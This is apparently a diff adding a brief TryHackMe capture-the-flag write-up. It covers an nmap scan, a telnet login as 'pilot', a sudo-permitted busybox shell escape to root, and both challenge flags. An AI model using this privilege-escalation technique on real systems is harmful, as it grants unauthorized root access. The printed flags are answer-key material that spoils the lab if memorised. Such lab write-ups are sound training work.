@@ -1,0 +1,69 @@
+nmap
+```
+└─$ sudo nmap -sV 10.10.118.92
+[sudo] password for gomez22: 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-06 14:01 PDT
+Nmap scan report for 10.10.118.92
+Host is up (0.16s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.5 (FreeBSD 20170903; protocol 2.0)
+23/tcp open  telnet  BSD-derived telnetd
+Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
+
+```
+
+telnet
+```
+└─$ telnet 10.10.118.92
+Trying 10.10.118.92...
+Connected to 10.10.118.92.
+Escape character is '^]'.
+login: pilot
+Last login: Wed Jul  6 21:13:29 from ip-10-8-248-108.eu-west-1.compute.internal
+FreeBSD 11.2-STABLE (GENERIC) #0 r345837: Thu Apr  4 02:07:22 UTC 2019
+
+Welcome to FreeBSD!
+
+Release Notes, Errata: https://www.FreeBSD.org/releases/
+Security Advisories:   https://www.FreeBSD.org/security/
+FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
+FreeBSD FAQ:           https://www.FreeBSD.org/faq/
+Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
+FreeBSD Forums:        https://forums.FreeBSD.org/
+
+Documents installed with the system are in the /usr/local/share/doc/freebsd/
+directory, or can be installed later with:  pkg install en-freebsd-doc
+For other languages, replace "en" with a language code like de or fr.
+
+Show the version of FreeBSD installed:  freebsd-version ; uname -a
+Please include that output and any error messages when posting questions.
+Introduction to manual pages:  man man
+FreeBSD directory layout:      man hier
+
+Edit /etc/motd to change this login announcement.
+Need to do a search in a manpage or in a file you've sent to a pager? Use
+"/search_word". To repeat the same search, type "n" for next.
+                -- Dru <genesis@istar.ca>
+[pilot@freebsd ~]$ 
+[pilot@freebsd ~]$ sudo -l
+User pilot may run the following commands on freebsd:
+    (root) NOPASSWD: /usr/local/bin/busybox
+```
+
+/home/pilot/user.txt
+`THM{r3m0v3_b3f0r3_fl16h7}`
+
+
+Found exploit on `gtfobins` for busybox
+```
+[pilot@freebsd ~]$ sudo -l
+User pilot may run the following commands on freebsd:
+    (root) NOPASSWD: /usr/local/bin/busybox
+[pilot@freebsd ~]$ sudo /usr/local/bin/busybox sh
+# whoami
+root
+```
+
+/root/root.txt
+`THM{h16hw4y_70_7h3_d4n63r_z0n3}`
